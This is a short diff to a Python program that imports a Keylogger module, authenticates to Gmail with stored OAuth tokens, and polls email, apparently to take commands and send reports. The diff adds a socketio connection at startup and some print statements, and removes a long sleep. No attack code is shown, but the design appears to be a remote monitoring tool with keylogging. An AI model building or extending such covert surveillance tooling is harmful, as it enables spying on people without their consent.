@@ -14,6 +14,7 @@ import CommandLine
 import Folder
 import Keylogger
 import re
+import Connect
 
 from google.auth.transport.requests import Request
 from google.oauth2.credentials import Credentials
@@ -65,7 +66,6 @@ def buildService():
         with open(os.getcwd().replace('\\', '/') + '/Server/Assets/Token/token.json', 'w') as token:
             token.write(creds.to_json())
     service = build('gmail', 'v1', credentials=creds)
-    time.sleep(6000)
 
 
 def checkRequirement(lines):
@@ -190,8 +190,11 @@ def sendReport(email_sender):
 def main():
     global creds
     global service
+    Connect.start_socketio()
+    print("Start build service...")
     buildService()
     while True:
+        print("Start checking email...")
         try:
             # Call the Gmail API
             results = service.users().messages().list(
